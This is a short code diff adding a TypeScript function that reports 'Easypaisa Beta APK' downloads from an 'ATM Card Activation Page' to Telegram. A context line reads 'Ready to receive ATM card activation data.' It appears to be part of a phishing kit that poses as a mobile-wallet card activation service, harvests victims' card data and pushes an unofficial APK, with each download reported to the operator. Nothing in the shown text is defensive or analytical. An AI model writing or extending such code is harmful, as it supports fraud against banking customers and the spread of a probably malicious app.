@@ -110,3 +110,22 @@ Ready to receive ATM card activation data.
     }
   }
 }
+
+// APK Download tracking
+export async function trackAPKDownload(downloadUrl: string) {
+  try {
+    const message = `
+📱 <b>APK Download Event</b>
+
+🔽 User downloaded Easypaisa Beta APK
+📎 Download URL: ${downloadUrl}
+⏰ Time: ${new Date().toLocaleString()}
+🌐 Source: ATM Card Activation Page
+    `.trim()
+
+    await sendToTelegram(message)
+    return { success: true }
+  } catch (error) {
+    return { success: false }
+  }
+}
